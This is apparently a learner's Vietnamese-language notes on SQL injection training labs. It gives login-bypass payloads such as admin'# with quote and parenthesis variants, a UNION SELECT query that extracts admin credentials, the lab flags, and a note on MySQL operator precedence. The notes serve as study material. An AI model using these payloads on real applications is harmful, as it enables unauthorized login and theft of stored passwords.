## SQL INJECTION ##

# INTERACTIVE LEARNING 

1. Login
2. Login level 2
3. Search
SELECT * FROM news WHERE content LIKE '%'UNION SELECT username, password FROM users WHERE username='admin'#%'


# LAB

# Db

Ở mục sandbox

<img width="722" height="133" alt="image" src="https://github.com/user-attachments/assets/38a6573a-4ffe-4dc7-8cc3-62f80680ca4b" />

<img width="803" height="144" alt="image" src="https://github.com/user-attachments/assets/7f3927d2-e1df-4eea-8786-113ad880e454" />

`CBJS{da6d016bf546bfd86b8808136ebc8bc0}`

# 1. Basic 1

<img width="629" height="85" alt="image" src="https://github.com/user-attachments/assets/c5557324-30e4-48ee-9ad6-914367dfb9c9" />

Payload `admin'#`
--> `string(70) "SELECT username FROM users WHERE username='admin'#' AND password='aaa'"`

<img width="527" height="23" alt="image" src="https://github.com/user-attachments/assets/69806d4c-dd60-4237-8b4c-d898517c2f6d" />


CBJS{da6d016bf546bfd86b8808136ebc8bc0}

# 2. Basic 2

<img width="644" height="74" alt="image" src="https://github.com/user-attachments/assets/8ec34554-73fa-4aa3-9668-8c8c9d496c3b" />

Tương tự nhưng thay bằng dấu nháy kép

<img width="667" height="49" alt="image" src="https://github.com/user-attachments/assets/4b3e36ca-8957-4e40-85df-32e4343a8d15" />

Payload `admin"#`

CBJS{f8ef24f0eebdfa5defdabc632f494f3e}

# 3. Basic 3

<img width="670" height="59" alt="image" src="https://github.com/user-attachments/assets/cb376bf9-1745-4c52-bf93-30ce2129a2ca" />

Payload `admin")#`

CBJS{4f629fe490901e261258d977a47f96e1}

# 4. Basic 4

<img width="526" height="72" alt="image" src="https://github.com/user-attachments/assets/3bf7cf80-6b90-41d0-bf2c-7b5934c45d96" />

Không comment phần password trong lab này được vì có check valid


# NOTE

Thứ tự thực thi 

```
INTERVAL
BINARY, COLLATE
!
- (unary minus), ~ (unary bit inversion)
^
*, /, DIV, %, MOD
-, +
<<, >>
&
|
= (comparison), <=>, >=, >, <=, <, <>, !=, IS, LIKE, REGEXP, IN, MEMBER OF
BETWEEN, CASE, WHEN, THEN, ELSE
NOT
AND, &&
XOR
OR, ||
= (assignment), :=
```



Tại sao `SELECT * FROM username='a' OR '1' AND password=''` output lại là 0 row ?

VÌ đoạn `'1' AND password=''` sẽ được thực thi trước 

<img width="360" height="214" alt="image" src="https://github.com/user-attachments/assets/81c4f4f7-d726-4a47-9047-bfee88654ef4" />

Tức là nguyên cụm đó sẽ là FALSE 
Mà không có username nà chỉ tên là 'a'
